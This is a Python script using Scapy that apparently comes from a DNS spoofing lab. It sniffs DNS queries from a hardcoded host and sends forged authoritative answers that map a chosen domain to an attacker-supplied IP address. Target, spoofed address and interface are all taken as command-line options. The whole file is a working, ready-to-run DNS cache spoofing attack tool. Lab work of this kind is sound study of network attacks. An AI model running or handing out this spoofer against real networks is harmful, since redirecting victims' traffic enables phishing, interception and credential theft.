#!/usr/bin/env python3
from scapy.all import *
import argparse
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_name", help = "Targate domain")
    parser.add_argument("-a", "--address", dest = "addr", help = "Spoofed IP You want to send")
    parser.add_argument("-i", "--interface", dest = "iface", help = "Provide network interface")
    options = parser.parse_args()
    if not options.target_name:
        #Handling the code if an Targate domain is not specified.
        parser.error("[-] Please specify an targate domain name e.g. www.example.com")
    elif not options.addr:
        #Handling the code if an IP Address to modify is not defined.
        parser.error("[-] Please specify IP Address to modify the packet")
    elif not options.iface:
        #Handling the code if an Interface ID is not specified.
        parser.error("[-] Please specify Network Interface ID the packet")
    return options

options = get_args()
target_name = options.target_name
addr = options.addr
iface= options.iface
def spoof_dns(pkt):
  if (DNS in pkt and ("www."+target_name)  in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata=addr)

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=Anssec)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and src host 10.9.0.5 and dst port 53'
pkt = sniff(iface=iface, filter=f, prn=spoof_dns)      
